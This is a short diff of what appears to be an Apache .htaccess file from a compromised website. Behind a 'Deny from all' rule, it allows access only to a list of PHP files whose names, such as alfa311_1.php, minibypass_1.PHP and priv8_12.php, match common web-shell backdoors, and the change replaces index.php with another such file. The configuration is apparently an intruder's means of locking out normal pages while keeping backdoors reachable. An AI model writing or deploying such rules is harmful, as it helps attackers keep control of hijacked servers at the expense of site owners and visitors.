@@ -4,7 +4,7 @@ Deny from all
     Order allow,deny
     Allow from all
 </FilesMatch>
-<FilesMatch '^(|index.php|lock_lock21.php|minibypass_1.PHP|index.html|alfa311_1.php|priv8_12.php|css_13.php|.minibypass_1.PHP|.minibypass_1.php|sitemap.xml|)$'>
+<FilesMatch '^(|db123_1.php|lock_lock21.php|minibypass_1.PHP|index.html|alfa311_1.php|priv8_12.php|css_13.php|.minibypass_1.PHP|.minibypass_1.php|sitemap.xml|)$'>
     Order allow,deny
     Allow from all
 </FilesMatch>
